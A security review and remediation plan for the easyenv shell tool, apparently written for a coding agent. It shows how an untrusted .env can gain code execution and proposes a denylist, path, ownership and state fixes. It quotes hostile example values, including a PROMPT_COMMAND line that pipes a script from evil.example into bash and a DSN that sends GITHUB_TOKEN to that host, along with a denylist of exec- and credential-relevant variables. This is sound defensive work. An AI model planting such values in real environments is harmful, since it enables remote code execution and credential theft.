# easyenv — security review and remediation plan

Context for the implementing agent: this is a review of `Chris1221/easyenv` at
commit-time `main` (29 commits). It covers **security only**. Comparison-table and
benchmarking work is being handled separately and is out of scope for this document.

> **Superseded in part.** The escape-hatch design in P0-1 and the whole of P1-1 are
> replaced by `easyenv-blocklists-and-config.md`, which specifies a TOML config file
> with compiled-in default blocklists that the user can add to or subtract from.
> Read that document for the concrete name and directory lists. Everything else
> below still applies.

**Summary of findings.** The mechanical shell-code generation is correct.
`shell::is_valid_shell_key` properly restricts keys to `[A-Za-z_][A-Za-z0-9_]*`, and
`shell::shell_single_quote` correctly applies the `'\''` escape, so there is no
injection *through* the `eval`. Every issue below is about what the `eval`
legitimately does once a `.env` file is trusted implicitly.

The central problem: easyenv deliberately has no trust step, so any `.env` between
the current directory and `/` is applied automatically. That is a fine design goal,
but it is only safe if the set of things a `.env` can do is genuinely inert. Right
now it is not — a `.env` in a freshly cloned repository can achieve arbitrary code
execution.

Priorities: **P0** = exploitable code execution, fix first. **P1** = information
disclosure or state integrity. **P2** = hardening and documentation accuracy.

---

## P0-1 — Deny exec-relevant variable names

**Files:** `src/shell/mod.rs` (new denylist fn), `src/main.rs` (`run_export`, the
existing `target.retain` block), `src/main.rs` (`run_status`).

### The problem

Correct quoting stops `FOO='; rm -rf /'`. It does not stop this:

```sh
# .env committed to any repository
PROMPT_COMMAND=curl -s https://evil.example/x.sh | bash
```

`PROMPT_COMMAND` is a valid POSIX shell identifier, so it passes
`is_valid_shell_key`, is correctly single-quoted, and emitted as
`export PROMPT_COMMAND='curl -s ... | bash'`. Because the hook's `eval` runs in the
interactive shell, this sets the live shell variable, and bash executes it before
the next prompt is drawn. Full code execution from `git clone && cd`.

The same class of problem covers a wide family of names. Grouped by mechanism:

| Mechanism | Variables |
| --- | --- |
| Executes in the interactive shell itself | `PROMPT_COMMAND`, `PS0`, `PS1`, `PS2`, `PS4` (bash performs command substitution in prompt strings by default — `promptvars` is on) |
| Executes in every child process | `BASH_ENV`, `ENV`, `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `DYLD_FRAMEWORK_PATH` |
| Executes via a language runtime | `NODE_OPTIONS` (`--require ./evil.js`), `PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`, `PERL5LIB`, `RUBYOPT`, `RUBYLIB`, `JAVA_TOOL_OPTIONS`, `_JAVA_OPTIONS`, `CLASSPATH` |
| Executes on next use of a common tool | `PATH`, `GIT_SSH_COMMAND`, `GIT_SSH`, `GIT_EXTERNAL_DIFF`, `GIT_PAGER`, `GIT_EDITOR`, `PAGER`, `EDITOR`, `VISUAL`, `MANPAGER`, `BROWSER`, `LESSOPEN`, `LESSCLOSE` |
| Silently redirects traffic or credentials | `http_proxy`, `https_proxy`, `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `all_proxy`, `NO_PROXY`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, `NODE_TLS_REJECT_UNAUTHORIZED`, `GIT_SSL_CAINFO`, `GIT_SSL_NO_VERIFY` |
| Redirects tooling at attacker infrastructure | `AWS_ENDPOINT_URL`, `AWS_CONFIG_FILE`, `AWS_SHARED_CREDENTIALS_FILE`, `KUBECONFIG`, `DOCKER_HOST`, `DOCKER_CONFIG`, `SSH_AUTH_SOCK`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_COUNT` |
| Shell parsing / history integrity | `IFS`, `CDPATH`, `GLOBIGNORE`, `HISTFILE`, `HISTIGNORE`, `BASHOPTS`, `SHELLOPTS`, `TMPDIR` |

Note `SHELLOPTS` and `BASHOPTS` are readonly in a running bash — emitting an
`export` for them produces a shell error inside the hook's `eval` on every prompt,
which is its own (cosmetic but user-visible) bug. Denying them fixes both.

### What to implement

Add to `src/shell/mod.rs`:

```rust
/// Variable names whose *semantics* make them unsafe to set from an
/// implicitly-trusted `.env`. easyenv has no per-directory trust step, so a
/// `.env` in a freshly cloned repository is applied automatically; the design
/// is only defensible if the set of things a `.env` can express is inert.
/// Setting any of these achieves code execution, traffic interception, or
/// credential redirection.
pub fn is_denied_key(key: &str) -> bool { /* ... */ }
```

Implementation notes:

- Match the exact names above **case-insensitively** for the proxy variables
  (both `http_proxy` and `HTTP_PROXY` are honoured by different tools); exact-match
  the rest.
- Also deny by **prefix**: `LD_`, `DYLD_`, `BASH_FUNC_` (function-import smuggling,
  the Shellshock shape), and `EASYENV_` (see P1-2).
- Prefer a `phf` set or a sorted `&[&str]` + binary search over a `HashSet` rebuilt
  per invocation — this is on the non-fast-path but still runs on every `cd`.
- Denied keys are **skipped with a warning on stderr**, matching the existing
  behaviour for non-identifier keys:
  `easyenv: warning: refusing to set {key:?} from {path} (see docs/reference/security.md)`.
  Include the source file path so the user can find the offending `.env`.
- Apply the filter in the same `target.retain` block in `run_export` that already
  calls `is_valid_shell_key`, **and** in `run_status` so `easyenv status` shows
  the same picture the hook would apply. `status` should mark them visibly, e.g.
  `KEY=value  (from /path/.env) [DENIED]`.

### Escape hatch

Some users will legitimately want `PATH` manipulation. Provide one, but make it a
deliberate act that cannot come from the untrusted file itself:

- Environment variable `EASYENV_ALLOW=PATH,NODE_OPTIONS` read from the **process
  environment only**, never honoured if it appears in a `.env` (the `EASYENV_`
  prefix denial in the parser guarantees this).
- Document it as "this reintroduces the code-execution risk for these names".

Do **not** implement a per-directory opt-in file for this — that recreates
`.envrc`, which is the thing easyenv exists to avoid.

### Tests

Add to `tests/shell_integration.rs` (these must be real shell tests, since the
whole point is what bash does with the value, not what easyenv prints):

1. `.env` with `PROMPT_COMMAND=touch /tmp/easyenv_pwned_$$` → `cd` in → next prompt
   → assert the file does **not** exist, and that a warning appeared on stderr.
2. `.env` with `PS1='$(touch /tmp/easyenv_pwned_$$)'` → same assertion.
3. `.env` with `PATH=/tmp/nonexistent` → assert `$PATH` is unchanged after `cd` in.
4. `.env` with `BASH_ENV=/tmp/evil.sh` where `evil.sh` writes a marker → run a
   non-interactive `bash script.sh` from the loaded directory → assert no marker.
5. `.env` with `SHELLOPTS=xtrace` → assert no shell error text on stderr.
6. Unit tests in `src/shell/mod.rs` for `is_denied_key`: prefix matches
   (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `EASYENV_STATE`), case-insensitive proxy
   matches, and negative cases (`DATABASE_URL`, `PATHOLOGY`, `LDAP_URL`,
   `MY_PATH` must **not** be denied — verify the prefix matching is anchored and
   does not overreach).

Test 6's negative cases matter: a sloppy `starts_with("LD_")` check is fine, but a
`contains("PATH")` check would break `MY_PATH` and `PATHOLOGY`. Anchor everything.

---

## P0-2 — The hook must call easyenv by absolute path

**Files:** `src/shell/bash.rs` (`HOOK_SCRIPT`), `src/shell/zsh.rs` (`HOOK_SCRIPT`),
`src/shell/mod.rs` (`init_snippet`), `src/main.rs` (`Command::Hook` arm).

### The problem

`HOOK_SCRIPT` currently contains `eval "$(easyenv export bash)"` — a bare command
resolved through `PATH`. Combined with P0-1, this is a self-hijack: a `.env` that
sets `PATH=/tmp/evil` causes the *next* prompt to execute `/tmp/evil/easyenv`.
Fixing P0-1 closes the specific `.env` route, but any other PATH-modifying tool in
the user's setup reopens it, and defence in depth is cheap here.

`install.sh` already writes an absolute path into the rc file (good), so this gap
only affects `cargo install` users and anyone who followed `easyenv init` output.

### What to implement

- `HOOK_SCRIPT` becomes a format string. At `hook` time, resolve
  `std::env::current_exe()` and interpolate the resulting absolute path, shell-quoted
  via the existing `shell_single_quote`.
- Fall back to the bare name if `current_exe()` fails, with a stderr warning.
- Change the signature: `hook_script()` currently returns `&'static str`; it needs to
  return `String`. Update `ShellKind::hook_script` and the `Command::Hook` arm in
  `main.rs`.
- Do the same for `init_snippet()` so the line users paste into their rc file is also
  absolute.

### Test

Install the hook in a temp shell with a `PATH` that contains a fake `easyenv`
shim earlier than the real one; assert the real binary still runs.

---

## P1-1 — Do not follow `.env` files the user does not own

**File:** `src/discover.rs` (`discover_env_files`).

### The problem

The walk goes to `/` with no ownership or permission check. `/tmp` is
world-writable, so on any shared machine any local user can create `/tmp/.env`, and
it applies to every easyenv user who `cd`s anywhere beneath `/tmp`. The same holds
for group-writable shared project directories and mounted network volumes.

`std::fs::canonicalize` is applied to the *starting directory*, not to the `.env`
files themselves, so a `.env` that is a symlink to a file elsewhere is followed
without comment.

### What to implement

Two independent changes:

1. **Ownership and mode gate.** For each candidate, `std::fs::symlink_metadata` and
   skip (with a stderr warning naming the path) if:
   - the owning uid is neither the invoking uid nor 0, **or**
   - the mode has group-write or other-write set.

   Gate this behind `#[cfg(unix)]` using `std::os::unix::fs::MetadataExt`. On Windows
   this check is a no-op for now; leave a `TODO` rather than inventing an ACL check.

2. **Walk boundary.** Default the upward walk to stop at `$HOME` rather than `/`,
   with `EASYENV_ROOT` to override (set it to `/` to restore current behaviour).
   Rationale: the ancestors above `$HOME` are exactly the ones the user does not
   control and did not intend to configure, and stopping there also shortens the
   `stat` walk on network filesystems. If `$HOME` is unset or the cwd is not beneath
   it, fall back to `/` with the ownership gate above doing the work.

   This is a behaviour change — call it out in `CHANGELOG.md` and the docs.

### Tests

- A `.env` with mode `0666` in an ancestor is skipped with a warning.
- A `.env` owned by another uid is skipped. (Needs root to set up; gate with
  `#[ignore]` and run in CI where the runner can, or simulate with a mocked
  metadata trait — the former is simpler.)
- The `$HOME` boundary: a `.env` in a directory above `$HOME` is not picked up by
  default and *is* picked up with `EASYENV_ROOT=/`.
- Existing `discover.rs` tests use `tempfile::tempdir()`, which lands outside
  `$HOME` — they will break under the new default. Set `EASYENV_ROOT=/` in those
  tests, or better, thread the boundary through as a parameter to
  `discover_env_files` so tests pass it explicitly rather than relying on process
  environment.

---

## P1-2 — Reserve the `EASYENV_` prefix; the state token is attacker-reachable

**Files:** `src/main.rs` (`run_export` retain block), `src/state.rs`.

### The problem

`EASYENV_STATE` is a valid shell identifier, so a `.env` can set it. In
`posix_format_ops` the genuine token is written last, so the immediate effect within
one `eval` is limited — but the crafted value has already been merged into `target`,
so it lands in `new_managed` with the *real* token recorded as its `prior`. On the
next invocation the diff runs against state the attacker influenced.

Reachable effects: cause easyenv to `unset` arbitrary variables, and — because
restoring a prior value emits `export KEY=value` — to *set* arbitrary key/value
pairs on `cd` out, including the names denied in P0-1. That path bypasses the P0-1
filter unless the denylist is also applied to restores.

### What to implement

- Deny the `EASYENV_` prefix in the `target.retain` filter (this falls out of P0-1's
  prefix denial — just make sure the prefix list includes it and there is a dedicated
  test).
- **Apply the denylist to restore operations too**, in `diff::compute_diff` or at
  `Op` construction. A prior value can only have entered state through a `.env`, so a
  denied name should never be emitted in either direction. This is the belt to
  P0-1's braces.
- Consider adding a truncated MAC over the encoded state, keyed by something
  per-shell and not derivable from a `.env` (shell PID plus a random per-session
  value stored alongside — see P1-3, which makes this easy). Bump `FORMAT_VERSION`;
  `decode` already returns `None` on version mismatch and callers already treat that
  as "recompute from scratch", so the upgrade path is clean.

### Test

`.env` containing `EASYENV_STATE=<crafted base64>` → assert the key is skipped with
a warning and that state on the following prompt is intact.

---

## P1-3 — `EASYENV_STATE` leaks shadowed secrets into the environment

**Files:** `src/state.rs`, `src/main.rs`, `src/shell/mod.rs` (`posix_format_ops`).

### The problem

For every managed key, state stores the value the variable held *before* easyenv
touched it. If a repository's `.env` shadows a variable the user already had — say
`GITHUB_TOKEN` or `AWS_SECRET_ACCESS_KEY` — the original value is now base64'd into
`EASYENV_STATE`, which is **exported**. Consequences:

- Inherited by every child process, including build scripts in the untrusted
  repository whose `.env` triggered the shadowing in the first place.
- Captured by crash reporters, `printenv` output pasted into bug reports, and
  environment dumps in support tickets.
- Base64 defeats naive secret scanners that would have flagged the raw value, so a
  team that scrubs `AWS_SECRET_ACCESS_KEY` from logs still leaks it.
- Rides along through `ssh -o SendEnv`, `docker run --env-file <(env)`, and tmux
  session inheritance.

### What to implement

Move the state off the environment:

- Write the encoded state to a file under `$XDG_RUNTIME_DIR` (falling back to
  `$TMPDIR`, then `/tmp`), created with mode `0600`, named by shell PID plus a
  random per-session nonce: `easyenv-state-{ppid}-{nonce}`.
- `EASYENV_STATE` continues to exist as an exported variable, but holds only the
  **pointer** (`{ppid}:{nonce}`), which is not secret.
- Unlink stale files: on each non-fast-path invocation, opportunistically remove
  files whose ppid no longer exists. Keep this cheap — it is on the `cd` path.
- Verify the file's ownership and mode before reading it, and treat any anomaly as
  "no prior state" (the existing self-healing path).
- If the file cannot be created, fall back to the current inline-token behaviour
  rather than failing — but emit a one-time stderr warning.

This also gives you the per-session secret needed for the MAC in P1-2.

**Alternative if this is judged too invasive for now:** keep the inline token, but
document the exposure prominently in a new `docs/reference/security.md`, and have
`easyenv status` decode and display what is currently in the token so the leak is at
least visible. This is a genuinely worse outcome and should be treated as a
temporary position.

---

## P1-4 — `dotenvy` *does* expand `$VAR`; the FAQ says it does not

**Files:** `docs/reference/faq.md`, `src/dotenv.rs`, tests.

### The problem

`docs/reference/faq.md` states that values are opaque literals and that
`FOO=$BAR` sets `FOO` to the literal text `$BAR`. This is incorrect for
`dotenvy` 0.15.7. In `dotenvy`'s `parse.rs`, `apply_substitution` calls
`env::var(substitution_name)` first, falling back to keys defined earlier in the
same file. Only **single-quoted** values are literal:

| Line | Actual result |
| --- | --- |
| `FOO=$BAR` | substitutes from process env / earlier keys |
| `FOO="$BAR"` | substitutes |
| `FOO='$BAR'` | literal `$BAR` |
| `FOO=${BAR}` | substitutes |

Security relevance: a hostile `.env` can copy ambient secrets into a key whose name
it chooses, e.g. `SENTRY_DSN=https://evil.example/${GITHUB_TOKEN}`, turning the
documented "no expansion" into an exfiltration primitive the moment the value is
used by a tool that phones home.

### What to implement

Pick one and be explicit about it:

- **Option A (recommended, matches the documented intent):** pre-escape `$` in
  values before handing lines to `dotenvy`, or post-process to restore literals, so
  the advertised semantics hold. This is the safer default and removes the
  exfiltration primitive.
- **Option B:** keep substitution and rewrite the FAQ to describe it accurately,
  including the single-quote rule and the security note above.

Either way, add unit tests in `src/dotenv.rs` pinning the behaviour for all four
rows of the table so a future `dotenvy` bump cannot silently change it. The existing
test `parses_quotes_comments_export_prefix_blank_lines` asserts
`BAR='literal $NOT_EXPANDED'` stays literal, which passes under both options and so
does not currently pin anything — the missing case is the *unquoted* one.

---

## P2-1 — Bound parsing work

**File:** `src/dotenv.rs` (`parse_file`).

`parse_file` has no size or count limit. A large file named `.env` in an ancestor
directory (accidental or hostile) is fully iterated on every non-fast-path
invocation, and every malformed line pushes a `String` onto `warnings`, which is then
printed to stderr on every `cd`.

Implement: skip files larger than a cap (1 MiB is generous for a `.env`) with a
single warning; cap variables per file (e.g. 1000); cap emitted warnings per file
(e.g. 10, then "… and N more"). Statting for size is already done in
`fastpath::compute_signature`, so the metadata call is not new work.

---

## P2-2 — `install.sh` fails open on checksum verification

**File:** `install.sh` (around the `verify_checksum` function, line ~87).

```
warn "no sha256sum or shasum found -- skipping checksum verification"
```

This silently downgrades to no verification on any machine lacking both tools.
Change to a hard failure, with `--no-verify` as an explicit opt-out flag.

Separately, worth noting in the docs: the checksum is fetched from the same origin
as the artifact, so it protects against corrupted transfers, not against a
compromised release. Given the `curl | bash` install path, publishing minisign or
cosign signatures and verifying against a pinned public key would be a real
improvement. Track as a follow-up, not a blocker.

---

## P2-3 — Documentation

Add `docs/reference/security.md` covering:

- **The trust model, stated plainly.** easyenv has no per-directory allow step
  because the set of things a `.env` can express is restricted to inert values.
  Name the denylist and link to it. This is the honest framing and it is a stronger
  pitch than the current one — it converts "no trust prompt" from a hand-wave into a
  design property with an enforcement mechanism.
- The `EASYENV_ALLOW` escape hatch and what it reintroduces.
- The ownership/mode rules and the `$HOME` boundary, with `EASYENV_ROOT`.
- Where state lives and what it contains.
- **A recommendation against putting credentials in ancestor `.env` files.** The
  home page currently demonstrates `SHARED_TOKEN` in `~/projects/.env`, which hands
  that token to every project beneath it — including repositories cloned to inspect.
  Change that example to something inert (`LOG_LEVEL`, `AWS_REGION`) and add a
  callout.

Update `docs/index.md` and `README.md`: the comparison table's
"No per-directory trust/allow step ✅" row currently scores a security property as a
usability win, which a direnv-literate reader will spot immediately. Add a row for
blast radius — something like "What a hostile `.env` in a cloned repo can do" — and
answer it honestly for all four columns. Post-fix, easyenv's answer becomes "set
inert variables only", which is a genuinely good row to have.

Also update the FAQ per P1-4, and add a line noting that the fast-path signature is
mtime+size, so an edit preserving both within the same mtime tick is not detected
until the next change. It fails safe (stale, never wrong), but filesystems with
one-second mtime granularity widen that window.

---

## Suggested sequencing

1. P0-1 and P0-2 together, with the shell-integration tests — these are the
   exploitable ones and they share test scaffolding.
2. P1-2 (falls out of P0-1's prefix work; small).
3. P1-4 (decide Option A or B, then it is mostly tests and docs).
4. P1-1 (behaviour change — needs a CHANGELOG entry and touches existing tests).
5. P1-3 (largest refactor; the `docs/reference/security.md` stopgap buys time).
6. P2s.

Conventional Commits are enforced by `commitlint` on every PR. Suggested prefixes:
`fix(security):` for P0/P1 items, `feat:` for `EASYENV_ALLOW` and `EASYENV_ROOT`,
`docs:` for P2-3.